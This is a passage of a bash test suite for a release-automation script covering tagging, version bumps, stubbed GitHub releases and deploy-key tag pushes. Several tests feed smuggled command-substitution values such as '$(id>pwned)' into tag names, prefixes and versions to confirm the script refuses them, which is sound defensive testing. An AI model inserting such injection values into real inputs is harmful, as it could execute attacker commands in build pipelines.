check "the later run's checkout finds its own tag" "$(is "$out" pkg-v1.0.2)"
# A tag on a child of HEAD that changes more than the manifest is not a bump commit.
git -C "$clone" checkout -q --detach "$seed"
printf 'not a bump\n' > "$clone/README.md"
jq '.version = "1.0.9"' "$clone/packages/pkg/package.json" > "$clone/tmp.json" \
  && mv "$clone/tmp.json" "$clone/packages/pkg/package.json"
git -C "$clone" commit -q -am "feat: a child that is not a bump"
git -C "$clone" tag pkg-v1.0.9
git -C "$clone" checkout -q --detach "$seed"
tagged "$clone" pkg-v packages/pkg
check "a tagged child changing another file is skipped" "$(is "$out" pkg-v1.0.1)"
# The manifest already held the version, so `tag` tagged HEAD itself.
git -C "$work/c9/b" tag pkg-v1.0.0
tagged "$work/c9/b" pkg-v packages/pkg
check "a tag on HEAD itself: printed" "$(is "$out" pkg-v1.0.0)"
# A job that tags the commit it checked out (legion, the Envoy listener) passes no package dir.
tagged "$work/c9/b" pkg-v
check "without a package dir, a tag on HEAD itself: printed" "$(is "$out" pkg-v1.0.0)"

echo
echo "Case 10: tagged refuses a release tag whose name is not <prefix>X.Y.Z"
setup "$work/c10"
clone="$work/c10/a"
seed=$(git -C "$clone" rev-parse HEAD)
bump "$clone" 1.0.1
# shellcheck disable=SC2016 # literal $(…): git accepts it in a tag name
git -C "$clone" tag 'pkg-v1.0.1$(id>pwned)'
git -C "$clone" checkout -q --detach "$seed"
tagged "$clone" pkg-v packages/pkg
check "a command substitution on the bump commit: exits 1" "$(is "$rc" 1)"
check "a command substitution on the bump commit: prints no tag" "$(is "$out" "")"
check "a command substitution on the bump commit: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.1.*id.*pwned.*, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
check "a command substitution on the bump commit: nothing in it ran" "$([ ! -e "$clone/pwned" ] && echo true || echo false)"
# shellcheck disable=SC2016 # literal $(…), the tag's name
git -C "$clone" tag -d 'pkg-v1.0.1$(id>pwned)' >/dev/null
git -C "$clone" tag pkg-v1.0.0-rc.1
tagged "$clone" pkg-v packages/pkg
check "a pre-release on HEAD: exits 1" "$(is "$rc" 1)"
check "a pre-release on HEAD: prints no tag" "$(is "$out" "")"
check "a pre-release on HEAD: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.0-rc\.1, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
git -C "$clone" tag -d pkg-v1.0.0-rc.1 >/dev/null
# A leading zero, which release-bump.sh's arithmetic would read as octal.
for name in pkg-v1.010.0 pkg-v01.0.0; do
  git -C "$clone" tag "$name"
  tagged "$clone" pkg-v
  check "a leading zero on HEAD ($name), no package dir: exits 1" "$(is "$rc" 1)"
  check "a leading zero on HEAD ($name), no package dir: prints no tag" "$(is "$out" "")"
  check "a leading zero on HEAD ($name), no package dir: the error names the tag" "$(contains "$err" "^::error::release-push.sh tagged: ${name//./\\.}, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$")"
  git -C "$clone" tag -d "$name" >/dev/null
done
git -C "$clone" tag pkg-v1.0.0
tagged "$clone" pkg-v
check "a zero field is plain: pkg-v1.0.0 on HEAD, no package dir, printed" "$(is "$rc $out" "0 pkg-v1.0.0")"
git -C "$clone" tag -d pkg-v1.0.0 >/dev/null
# Git refuses a tag name holding a space or a newline, and ignores a ref file
# forged with one, so `tagged` is never handed either.
for name in 'pkg-v1.0.2 x' $'pkg-v1.0.2\nx'; do
  printf -v shown '%q' "$name"
  check "git refuses to create the tag $shown" "$(git -C "$clone" tag "$name" 2>/dev/null && echo false || echo true)"
  printf '%s\n' "$seed" > "$clone/.git/refs/tags/$name"
done
tagged "$clone" pkg-v packages/pkg
check "forged refs with a space and a newline: exits 0" "$(is "$rc" 0)"
check "forged refs with a space and a newline: prints no tag" "$(is "$out" "")"
check "forged refs with a space and a newline: git ignores both" "$(is "$(printf '%s\n' "$err" | { grep -c '^warning: ignoring ref with broken name refs/tags/pkg-v1\.0\.2' || true; })" 2)"

echo
echo "Case 10b: version releases the tag an earlier attempt pushed, else the bump since the newest tag"
# The stub npm, first on PATH. It logs each call to $NPM_TEST_DIR/npm-calls as
# one line, each argument in brackets, answers with $NPM_TEST_VERSION, and fails
# as npm does for a package it does not have when $NPM_TEST_FAIL is set.
mkdir -p "$work/bin"
cat > "$work/bin/npm" <<'NPM'
#!/usr/bin/env bash
{ printf '[%s]' "$@"; printf '\n'; } >> "$NPM_TEST_DIR/npm-calls"
[ -z "${NPM_TEST_FAIL:-}" ] || { echo "npm ERR! 404 Not Found" >&2; exit 1; }
echo "$NPM_TEST_VERSION"
NPM
chmod +x "$work/bin/npm"
# version_run <clone> <arg>...: runs `release-push.sh version <arg>...` from
# <clone>, with the job summary at $work/version.summary and the stub npm's log
# emptied first; leaves its exit code in rc, its stdout (the output lines) in
# out, its stderr in err, the summary in summary_md and npm's calls in npm_calls.
version_run() {
  local clone=$1
  shift
  : > "$work/version.summary"
  : > "$work/npm-calls"
  set +e
  out=$(cd "$clone" && GITHUB_STEP_SUMMARY="$work/version.summary" NPM_TEST_DIR="$work" \
    PATH="$work/bin:$PATH" "$release_push" version "$@" 2>"$work/version.err")
  rc=$?
  set -e
  err=$(<"$work/version.err")
  summary_md=$(<"$work/version.summary")
  npm_calls=$(<"$work/npm-calls")
}
# outputs <version> <tag> <skip>: the three lines `version` prints, as is compares them.
outputs() { printf 'version=%s\ntag=%s\nskip=%s' "$@"; }
setup "$work/v"
clone="$work/v/a"
seed=$(git -C "$clone" rev-parse HEAD)
git -C "$clone" tag pkg-v1.0.0
version_run "$clone" pkg-v -- packages/pkg/
check "a tag on HEAD: exits 0" "$(is "$rc" 0)"
check "a tag on HEAD: prints its version, the tag and skip=false, nothing else" "$(is "$out" "$(outputs 1.0.0 pkg-v1.0.0 false)")"
check "a tag on HEAD: says it was already pushed" "$(contains "$err" '^Releasing pkg-v1\.0\.0, already pushed for this checkout$')"
# What one release run leaves (case 9): its bump commit, a child of the checkout, tagged.
bump "$work/v/b" 1.0.1
git -C "$work/v/b" tag pkg-v1.0.1
git -C "$work/v/b" checkout -q --detach "$seed"
version_run "$work/v/b" pkg-v --package-dir packages/pkg -- packages/pkg/
check "a tag on HEAD's bump commit, with the package dir: that tag's version" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
version_run "$work/v/b" pkg-v -- packages/pkg/
check "the same without the package dir: the newest tag is on a descendant, so nothing is since it" "$(is "$rc $out" "0 $(outputs '' '' true)")"
# Commits since the tag, each kind from the tagged commit.
change "$clone" packages/pkg/index.js "feat: add an export"
feat=$(git -C "$clone" rev-parse HEAD)
version_run "$clone" pkg-v -- packages/pkg/
check "a feat: commit since the tag: exits 0" "$(is "$rc" 0)"
check "a feat: commit since the tag: bumps minor" "$(is "$out" "$(outputs 1.1.0 pkg-v1.1.0 false)")"
check "a feat: commit since the tag: logs the bump" "$(contains "$err" '^Bumping pkg-v1\.0\.0 -> pkg-v1\.1\.0$')"
git -C "$clone" checkout -q --detach pkg-v1.0.0
change "$clone" packages/pkg/index.js "fix: a bug"
fix=$(git -C "$clone" rev-parse HEAD)
version_run "$clone" pkg-v -- packages/pkg/
check "a fix: commit since the tag: bumps patch" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
git -C "$clone" checkout -q --detach pkg-v1.0.0
change "$clone" packages/pkg/README.md "docs: explain it"
docs=$(git -C "$clone" rev-parse HEAD)
version_run "$clone" pkg-v -- packages/pkg/
check "a docs: commit alone: exits 0, skipping, with an empty version and tag" "$(is "$rc $out" "0 $(outputs '' '' true)")"
check "a docs: commit alone: the notice names the tag" "$(contains "$err" '^::notice title=No release published::No version-bumping commits since pkg-v1\.0\.0$')"
check "a docs: commit alone: the job summary says the same" "$(is "$summary_md" '**No release published** — No version-bumping commits since pkg-v1.0.0')"
git -C "$clone" checkout -q --detach pkg-v1.0.0
change "$clone" README.md "feat: elsewhere in the repository"
version_run "$clone" pkg-v -- packages/pkg/
check "a commit outside the paths: exits 0, skipping" "$(is "$rc $out" "0 $(outputs '' '' true)")"
check "a commit outside the paths: says so plainly" "$(contains "$err" "^No commits in the release's paths since pkg-v1\.0\.0$")"
check "a commit outside the paths: no notice, no job summary" "$(is "$(contains "$err" '::notice')|$summary_md" 'false|')"
git -C "$clone" checkout -q --detach pkg-v1.0.0
change "$clone" docs/guide.md "docs: a guide the package ships"
version_run "$clone" pkg-v --patch-path docs/ -- packages/pkg/ docs/
check "a docs: commit on a --patch-path: bumps patch" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
# A first release: no tag of the prefix anywhere (origin never got one).
git clone -q "$work/v/origin.git" "$work/v/c"
identity "$work/v/c"
change "$work/v/c" packages/pkg/index.js "fix: a bug"
NPM_TEST_VERSION=2.3.4 version_run "$work/v/c" pkg-v --first-npm @example/pkg -- packages/pkg/
check "no tag, --first-npm: exits 0" "$(is "$rc" 0)"
check "no tag, --first-npm: bumps npm's version over the whole history" "$(is "$out" "$(outputs 2.3.5 pkg-v2.3.5 false)")"
check "no tag, --first-npm: asked npm for the package's version" "$(is "$npm_calls" '[view][@example/pkg][version]')"
check "no tag, --first-npm: logs the bump from npm's version" "$(contains "$err" '^Bumping v2\.3\.4 -> pkg-v2\.3\.5$')"
NPM_TEST_FAIL=1 version_run "$work/v/c" pkg-v --first-npm @example/pkg -- packages/pkg/
check "no tag, npm has no such package: starts from 0.0.0" "$(is "$rc $out" "0 $(outputs 0.0.1 pkg-v0.0.1 false)")"
version_run "$work/v/c" pkg-v -- packages/pkg/
check "no tag, no --first-npm: exits 1 printing nothing" "$(is "$rc|$out" "1|")"
check "no tag, no --first-npm: the error says a release line starts from a tag" \
  "$(contains "$err" '^::error::release-push.sh version: no pkg-v\* tag; a release line starts from a tag (push pkg-v0\.0\.0 on the commit before its first release)$')"
# --expect: what the build job handed against what the tags give now.
git -C "$clone" checkout -q --detach "$fix"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect, the tags agree: exits 0 with the three lines" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
git -C "$clone" checkout -q --detach "$feat"
GITHUB_RUN_ID=424242 version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect, the tags give another version: exits 1 printing nothing" "$(is "$rc|$out" "1|")"
check "--expect, the tags give another version: the error names both, the race and the run to re-run" \
  "$(contains "$err" '^::error::release-push.sh version: the build job handed v1\.0\.1; the tags now give 1\.1\.0: another run took the tag first\. Re-run the whole run (gh run rerun 424242), not only the failed jobs: the build job must compute the version again$')"
check "--expect, the tags give another version: no bump is logged" "$(is "$(contains "$err" 'Bumping')" false)"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect without GITHUB_RUN_ID: the re-run command keeps its placeholder" "$(contains "$err" 'gh run rerun <run id>')"
git -C "$clone" checkout -q --detach "$docs"
version_run "$clone" pkg-v --expect 1.0.1 -- packages/pkg/
check "--expect where there is nothing to release: exits 1 printing nothing" "$(is "$rc|$out" "1|")"
check "--expect where there is nothing to release: says so" "$(contains "$err" 'handed v1\.0\.1; the tags now give nothing to release: another run took the tag first')"
check "--expect where there is nothing to release: no notice, no job summary" "$(is "$(contains "$err" '::notice')|$summary_md" 'false|')"
# Refusals, each printing nothing.
git -C "$clone" checkout -q --detach "$feat"
git -C "$clone" tag pkg-v1.0.0-rc.1 "$seed"
version_run "$clone" pkg-v -- packages/pkg/
check "a pre-release as the newest tag: exits non-zero printing nothing" "$([ "$rc" != 0 ] && [ -z "$out" ] && echo true || echo false)"
check "a pre-release as the newest tag: release-bump.sh's refusal names it" \
  "$(contains "$err" '^::error::release-bump.sh: previous version 1\.0\.0-rc\.1 (range pkg-v1\.0\.0-rc\.1\.\.HEAD) is not a plain X\.Y\.Z version; refusing it$')"
git -C "$clone" tag -d pkg-v1.0.0-rc.1 >/dev/null
version_run "$clone" 'pkg v' -- packages/pkg/
check "a prefix with a space: exits 2 printing nothing" "$(is "$rc|$out" "2|")"
check "a prefix with a space: the error names it" "$(contains "$err" '^::error::release-push.sh version: tag prefix pkg\\ v holds more than letters, digits')"
# shellcheck disable=SC2016 # literal $(…), the prefix under test
version_run "$clone" 'pkg-v$(id>pwned)' -- packages/pkg/
check "a prefix with a command substitution: exits 2 printing nothing" "$(is "$rc|$out" "2|")"
check "a prefix with a command substitution: the error names it" "$(contains "$err" '^::error::release-push.sh version: tag prefix pkg-v.*id.*pwned.* holds more than')"
check "a prefix with a command substitution: nothing in it ran" "$([ ! -e "$clone/pwned" ] && echo true || echo false)"
version_run "$clone" pkg-v --expect abc -- packages/pkg/
check "--expect abc: exits 2 printing nothing" "$(is "$rc|$out" "2|")"
check "--expect abc: the error names it" "$(contains "$err" '^::error::release-push.sh version: --expect abc is not X\.Y\.Z')"
version_run "$clone" pkg-v --bogus -- packages/pkg/
check "an unknown option: exits 2 printing nothing, with the usage" "$(is "$rc|$out|$(contains "$err" '^::error::release-push.sh version: unknown option --bogus; usage: release-push.sh version ')" "2||true")"

echo
echo "Case 10c: tag commits the bump and tags it locally, pushing nothing"
# tag_run <clone> <version> <tag>: sets the manifest's version as the workflow
# does before `tag`, then runs `release-push.sh tag` from <clone>; leaves its
# exit code in rc and its combined output in out.
tag_run() {
  local clone=$1 v=$2 tag=$3
  set_version "$clone" "$v"
  set +e
  out=$(cd "$clone" && "$release_push" tag packages/pkg "chore: release pkg v$v [skip ci]" "$tag" 2>&1)
  rc=$?
  set -e
}
setup "$work/t"
clone="$work/t/a"
tag_run "$clone" 1.0.1 pkg-v1.0.1
check "tags: exits 0" "$(is "$rc" 0)"
check "tags: the clone has the bump commit" "$(is "$(git -C "$clone" log -1 --format=%s)" "chore: release pkg v1.0.1 [skip ci]")"
check "tags: the tag is on it" "$(is "$(git -C "$clone" rev-parse 'pkg-v1.0.1^{commit}')" "$(git -C "$clone" rev-parse HEAD)")"
check "tags: origin has no tag" "$(is "$(git -C "$work/t/origin.git" tag -l)" "")"
check "tags: origin/main is untouched" "$(is "$(origin_version "$work/t")" 1.0.0)"
tag_run "$clone" 1.0.1 pkg-v1.0.1
check "the same version again: exits 0, reusing the tag" "$(is "$rc|$(contains "$out" '^Tag pkg-v1\.0\.1 already exists for version 1\.0\.1; reusing it$')" '0|true')"
check "the same version again: still nothing on origin" "$(is "$(git -C "$work/t/origin.git" tag -l)" "")"
tag_run "$clone" 1.0.2 pkg-v1.0.1
check "another version under the existing tag: exits 1 naming both versions" \
  "$(is "$rc|$(contains "$out" '^::error::tag pkg-v1\.0\.1 already exists with version 1\.0\.1, not 1\.0\.2$')" '1|true')"

echo
echo "Case 11: release creates a missing release, publishes a draft, and reuses a published one"
# The stub gh, first on PATH. It logs each call to $GH_TEST_DIR/calls as one
# line, each argument in brackets, so an argument the script splits or joins
# shows up as a different log line. `gh release view <tag> ... --json isDraft
# -q .isDraft` answers for $GH_TEST_RELEASE: none (exit 1, as gh does for a
# missing release), draft or published (true or false), or odd (a value gh
# never prints). An upload, edit or create fails when $GH_TEST_FAIL names it.
# Any other call fails as unexpected, so a call the command should not make
# shows up as an error.
mkdir -p "$work/bin"
cat > "$work/bin/gh" <<'GH'
#!/usr/bin/env bash
{ printf '[%s]' "$@"; printf '\n'; } >> "$GH_TEST_DIR/calls"
case "$1 $2" in
  "release view")
    [[ " $* " == *" --json isDraft -q .isDraft "* ]] || { echo "view without --json isDraft: $*" >&2; exit 3; }
    case $GH_TEST_RELEASE in
      none) echo "release not found" >&2; exit 1 ;;
      draft) echo true ;;
      published) echo false ;;
      odd) echo null ;;
      *) echo "unknown GH_TEST_RELEASE $GH_TEST_RELEASE" >&2; exit 3 ;;
    esac ;;
  "release upload" | "release edit" | "release create")
    if [ "$GH_TEST_FAIL" = "$2" ]; then
      echo "HTTP 502: the test failed this $2" >&2
      exit 1
    fi ;;
  *) echo "unexpected gh call: $*" >&2; exit 3 ;;
esac
GH
chmod +x "$work/bin/gh"
# release_run <state> <fail> <args...>: runs `release-push.sh release <args...>`
# against the stub; leaves its exit code in rc, its combined output in out and
# the stub's call log in calls.
release_run() {
  local state=$1 fail=$2
  shift 2
  : > "$work/calls"
  set +e
  out=$(cd "$work" && GITHUB_REPOSITORY=example/repo GH_TEST_DIR="$work" GH_TEST_RELEASE="$state" \
    GH_TEST_FAIL="$fail" PATH="$work/bin:$PATH" "$release_push" release "$@" 2>&1)
  rc=$?
  set -e
  calls=$(<"$work/calls")
}
# argv <arg>...: one call as the stub logs it.
argv() { printf '[%s]' "$@"; }
view=$(argv release view pkg-v1.0.1 --repo example/repo --json isDraft -q .isDraft)
upload=$(argv release upload pkg-v1.0.1 a.tgz b.tgz --repo example/repo --clobber)
publish=$(argv release edit pkg-v1.0.1 --repo example/repo --draft=false)
release_run none "" pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "none: exits 0" "$(is "$rc" 0)"
check "none: creates it from the pushed tag, with generated notes" "$(is "$calls" "$view"$'\n'"$(argv release create pkg-v1.0.1 a.tgz b.tgz --repo example/repo --title "Pkg v1.0.1" --generate-notes --verify-tag)")"
check "none: the title reaches gh as one argument" "$(contains "$calls" '\[--title\]\[Pkg v1\.0\.1\]\[')"
release_run none "" --notes "Fixed notes, in a few words." pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "none, --notes: creates it with those notes" "$(is "$calls" "$view"$'\n'"$(argv release create pkg-v1.0.1 a.tgz b.tgz --repo example/repo --title "Pkg v1.0.1" --notes "Fixed notes, in a few words." --verify-tag)")"
check "none, --notes: the notes reach gh as one argument" "$(contains "$calls" '\[--notes\]\[Fixed notes, in a few words\.\]\[')"
release_run draft "" pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "draft: exits 0" "$(is "$rc" 0)"
check "draft: uploads this run's assets over its own, then publishes it" "$(is "$calls" "$view"$'\n'"$upload"$'\n'"$publish")"
check "draft: says it published the draft" "$(contains "$out" '^Published the draft release pkg-v1\.0\.1 with this run.s assets$')"
release_run published "" pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "published: exits 0" "$(is "$rc" 0)"
check "published: reuses it, touching nothing" "$(is "$calls" "$view")"
check "published: says it reused it" "$(contains "$out" '^Release pkg-v1\.0\.1 already exists; reusing it$')"
release_run published "" --upload-to-published pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "published, --upload-to-published: exits 0" "$(is "$rc" 0)"
check "published, --upload-to-published: uploads this run's assets over its own, and edits nothing" "$(is "$calls" "$view"$'\n'"$upload")"
release_run draft upload pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "draft, upload fails: exits 1" "$(is "$rc" 1)"
check "draft, upload fails: never publishes the draft" "$(is "$calls" "$view"$'\n'"$upload")"
check "draft, upload fails: says the draft is left unpublished" "$(contains "$out" "^::error::Uploading this run's assets to the draft release pkg-v1\.0\.1 failed; the draft is left unpublished\.$")"
release_run draft edit pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "draft, edit fails: exits 1" "$(is "$rc" 1)"
check "draft, edit fails: uploaded, then tried to publish" "$(is "$calls" "$view"$'\n'"$upload"$'\n'"$publish")"
check "draft, edit fails: says it is still a draft" "$(contains "$out" "^::error::Publishing the draft release pkg-v1\.0\.1 failed; it holds this run's assets and is still a draft\.$")"
release_run none create pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "none, create fails: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "none, create fails: gh's own error is shown" "$(contains "$out" '^HTTP 502: the test failed this create$')"
release_run published upload --upload-to-published pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "published, --upload-to-published, upload fails: exits 1" "$(is "$rc" 1)"
check "published, --upload-to-published, upload fails: says so" "$(contains "$out" "^::error::Uploading this run's assets to the published release pkg-v1\.0\.1 failed\.$")"
release_run odd "" pkg-v1.0.1 "Pkg v1.0.1" a.tgz b.tgz
check "a view answer that is neither true nor false: exits 1, uploading and creating nothing" "$(is "$rc|$calls" "1|$view")"
check "a view answer that is neither true nor false: the error names it" "$(contains "$out" '^::error::gh release view pkg-v1\.0\.1 printed null for isDraft, not true or false$')"
release_run none "" pkg-v1.0.1 "Pkg v1.0.1"
check "no asset: exits 2, calling no gh" "$(is "$rc|$calls" "2|")"
release_run none "" --draft pkg-v1.0.1 "Pkg v1.0.1" a.tgz
check "an unknown option: exits 2, calling no gh" "$(is "$rc|$calls" "2|")"

echo
echo "Case: push-tag pushes a tag with the deploy key and leaves no key behind"
# The push goes to git@github.com:<repo>.git; GIT_CONFIG_* rewrites that to a local bare origin,
# so git pushes locally and the key directory is all the script under test makes. The recording
# hook sees what the directory held while the push ran.
pt="$work/pt"
mkdir -p "$pt/tmp"
git init -q --bare "$pt/origin.git"
git init -q -b main "$pt/a"
identity "$pt/a"
git -C "$pt/a" commit -q --allow-empty -m seed
git -C "$pt/a" tag pkg-v1.0.1
record_hook "$pt/origin.git"
# push_tag <tag> [VAR=value...]: runs `release-push.sh push-tag <tag>` in clone a with the deploy
# key, a fresh TMPDIR and the rewrite to the local origin; leaves its exit code in rc, its output
# in out, what the hook saw in seen and what TMPDIR holds afterwards in left.
push_tag() {
  local tag=$1
  shift
  rm -rf "$pt/tmp" && mkdir "$pt/tmp"
  : > "$pt/seen"
  set +e
  out=$(cd "$pt/a" && env TMPDIR="$pt/tmp" PUSH_SEEN="$pt/seen" GITHUB_REPOSITORY=example/repo \
    DEPLOY_KEY="$(<"$work/deploy")" GIT_CONFIG_COUNT=1 \
    GIT_CONFIG_KEY_0="url.$pt/origin.git.insteadOf" GIT_CONFIG_VALUE_0="git@github.com:example/repo.git" \
    "$@" "$release_push" push-tag "$tag" 2>&1)
  rc=$?
  set -e
  seen=$(<"$pt/seen")
  left=$(find "$pt/tmp" -mindepth 1 | wc -l)
}
push_tag pkg-v1.0.1
check "pushes: exits 0" "$(is "$rc" 0)"
check "pushes: origin holds the tag, at the clone's commit" \
  "$(is "$(git -C "$pt/origin.git" rev-parse -q --verify refs/tags/pkg-v1.0.1)" "$(git -C "$pt/a" rev-parse pkg-v1.0.1)")"
check "pushes: the key and the pinned host keys were owner-only while the push ran" \
  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
check "pushes: nothing is left in TMPDIR" "$(is "$left" 0)"
# A tag origin lacks, so the push reaches the hook (one origin already holds is up to date).
git -C "$pt/a" tag pkg-v1.0.2
push_tag pkg-v1.0.2 PUSH_REJECT=1
check "a rejected push: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "a rejected push: the key was written for it" "$(contains "$seen" '^600 key$')"
check "a rejected push: nothing is left in TMPDIR" "$(is "$left" 0)"
check "a rejected push: origin has no such tag" \
  "$(is "$(git -C "$pt/origin.git" tag -l pkg-v1.0.2)" "")"
push_tag pkg-v1.0.1 DEPLOY_KEY=
check "no DEPLOY_KEY: exits non-zero, with an ::error:: naming the command and the variable" \
  "$([ "$rc" != 0 ] && contains "$out" '^::error::release-push.sh push-tag: DEPLOY_KEY' || echo false)"
check "no DEPLOY_KEY: nothing is made in TMPDIR" "$(is "$left" 0)"
push_tag pkg-v1.0.1 GITHUB_REPOSITORY=
check "no GITHUB_REPOSITORY: exits non-zero, with an ::error:: naming it, making nothing in TMPDIR" \
  "$([ "$rc" != 0 ] && is "$(contains "$out" '^::error::release-push.sh push-tag: GITHUB_REPOSITORY')|$left" 'true|0' || echo false)"

echo
echo "Case: push-tag holds GitHub's host keys and refuses any other"
# These reach github.com over SSH with a throwaway key no repository trusts, so each push is
# refused; what matters is which refusal. Without the network they are skipped, not counted.
if timeout 10 bash -c '</dev/tcp/github.com/22' 2>/dev/null; then
  # github_push <script> [VAR=value...]: runs <script> push-tag against a repository that does not
  # exist, with the throwaway key; leaves rc, out and left as push_tag does.
  github_push() {
    local script=$1
    shift
    rm -rf "$pt/tmp" && mkdir "$pt/tmp"
    set +e
    out=$(cd "$pt/a" && env TMPDIR="$pt/tmp" GITHUB_REPOSITORY=sjawhar/release-push-test-nonexistent \
      DEPLOY_KEY="$(<"$work/deploy")" "$@" "$script" push-tag pkg-v1.0.1 2>&1)
    rc=$?
    set -e
    left=$(find "$pt/tmp" -mindepth 1 | wc -l)
  }
  github_push "$release_push"
  check "the pinned keys: GitHub's host key is accepted and the throwaway key refused" \
    "$([ "$rc" != 0 ] && contains "$out" 'Permission denied (publickey)' || echo false)"
  check "the pinned keys: nothing is left in TMPDIR" "$(is "$left" 0)"
  # A copy of the script whose only pinned key is one GitHub does not hold.
  mkdir -p "$pt/swapped"
  ssh-keygen -q -t ed25519 -N '' -f "$pt/swapped/other"
  python3 - "$release_push" "$pt/swapped/release-push.sh" "$(cut -d' ' -f2 "$pt/swapped/other.pub")" <<'PY'
import re
import sys

source, target, other = sys.argv[1:]
text = open(source).read()
pinned = re.findall(r"(?m)^github\.com \S+ \S+$", text)
assert len(pinned) == 3, pinned
text = re.sub(r"(?m)^github\.com ssh-ed25519 \S+$", "github.com ssh-ed25519 " + other, text)
text = re.sub(r"(?m)^github\.com (ecdsa-sha2-nistp256|ssh-rsa) \S+\n", "", text)
open(target, "w").write(text)
PY
  chmod +x "$pt/swapped/release-push.sh"
  github_push "$pt/swapped/release-push.sh"
  check "a swapped host key: exits non-zero, the host key refused before any login" \
    "$([ "$rc" != 0 ] && contains "$out" 'REMOTE HOST IDENTIFICATION HAS CHANGED\|Host key verification failed' || echo false)"
  check "a swapped host key: no login was tried" "$(is "$(contains "$out" 'Permission denied (publickey)')" false)"
  check "a swapped host key: nothing is left in TMPDIR" "$(is "$left" 0)"
else
  echo "  SKIP: the host-key cases (github.com:22 is unreachable)"
fi

echo
echo "Case: push-tag's pinned host keys are the ones GitHub publishes"
# A rotation shows up here first. It needs gh signed in and the network, and is skipped without.
if command -v gh >/dev/null && published=$(gh api meta --jq '.ssh_keys[]' 2>/dev/null) && [ -n "$published" ]; then
  pinned=$(sed -n 's/^github\.com //p' "$release_push" | sort)
  check "the pinned keys equal gh api meta's ssh_keys" "$(is "$pinned" "$(sort <<<"$published")")"
else
  echo "  SKIP: the published-keys comparison (gh api meta failed: no gh, no sign-in or no network)"
fi

echo
echo "Case: handed refuses a version or a hand-over a compromised build could make, and prints the tag"
# Each case fills a directory with the four archives a release of 0.1.0 ships (dummy bytes: the
# bytes are the build job's to choose), changes one thing, and runs `handed envoy-infra-v
# <version> <dir>` with the names publish builds from the version it is given. It runs in $hd, so
# a version that executed would leave its proof file there.
hd="$work/handed"
mkdir -p "$hd"
handed_targets=(linux-amd64 linux-arm64 darwin-amd64 darwin-arm64)
# handed_run <case> <version> [<mutation>]: fills $hd/<case> with the 0.1.0 archives, runs the
# shell text <mutation> in it, then runs handed; leaves rc, out (stdout) and err (stderr).
handed_run() {
  local name=$1 version=$2 mutation=${3:-} dir="$hd/$1" target names=()
  mkdir "$dir"
  for target in "${handed_targets[@]}"; do
    printf 'archive %s\n' "$target" > "$dir/pulumi-resource-envoy-infra-v0.1.0-$target.tar.gz"
  done
  [ -z "$mutation" ] || (cd "$dir" && eval "$mutation")
  for target in "${handed_targets[@]}"; do
    names+=("pulumi-resource-envoy-infra-v$version-$target.tar.gz")
  done
  set +e
  out=$(cd "$hd" && "$release_push" handed envoy-infra-v "$version" "$dir" "${names[@]}" 2>"$hd/$name.err")
  rc=$?
  set -e
  err=$(<"$hd/$name.err")
}
# refused <description>: the three things every refusal shares, checked at once.
refused() {
  check "$1: exits non-zero, prints no tag" "$([ "$rc" != 0 ] && [ -z "$out" ] && echo true || echo false)"
}
a=pulumi-resource-envoy-infra-v0.1.0

handed_run real 0.1.0
check "the real set: exits 0" "$(is "$rc" 0)"
check "the real set: prints exactly the tag, the prefix and the version" "$(is "$out" envoy-infra-v0.1.0)"
check "the real set: says nothing on stderr" "$(is "$err" "")"

# shellcheck disable=SC2016 # the literal text a forged version would carry, never expanded
handed_run substitution '0.1.0$(id>pwned-version)'
refused "a version with a command substitution"
check "a version with a command substitution: is refused as not X.Y.Z" "$(contains "$err" 'is not X.Y.Z')"
check "a version with a command substitution: never runs" \
  "$([ ! -e "$hd/pwned-version" ] && [ ! -e "$hd/substitution/pwned-version" ] && echo true || echo false)"
handed_run leading-zero 0.01.0
refused "a version with a leading zero"
check "a version with a leading zero: names it" "$(contains "$err" 'version 0.01.0 is not X.Y.Z')"
handed_run two-fields 0.1
refused "a version of two fields"
check "a version of two fields: names it" "$(contains "$err" 'version 0.1 is not X.Y.Z')"
handed_run trailing-newline $'0.1.0\n'
refused "a version with a trailing newline"
check "a version with a trailing newline: is refused as not X.Y.Z" "$(contains "$err" 'is not X.Y.Z')"

handed_run another-release 99.0.0
refused "another release's version, over this release's archives"
check "another release's version: names the archives it expected" \
  "$(contains "$err" "lacks pulumi-resource-envoy-infra-v99.0.0-linux-amd64.tar.gz")"
check "another release's version: names the archives it was handed" \
  "$(contains "$err" "does not ship: .*$a-linux-amd64.tar.gz")"
handed_run missing 0.1.0 "rm $a-darwin-arm64.tar.gz"
refused "a missing archive"
check "a missing archive: names it" "$(contains "$err" "lacks $a-darwin-arm64.tar.gz")"
handed_run extra-file 0.1.0 "printf 'not legion\n' > legion-linux-amd64.tar.gz"
refused "an extra file"
check "an extra file: names it" "$(contains "$err" 'does not ship: legion-linux-amd64.tar.gz')"
handed_run build-sums 0.1.0 "sha256sum -- *.tar.gz > SHA256SUMS"
refused "a SHA256SUMS the build wrote (publish writes its own)"
check "a SHA256SUMS the build wrote: names it" "$(contains "$err" 'does not ship: SHA256SUMS')"
handed_run extra-dir 0.1.0 "mkdir sub && printf x > sub/x"
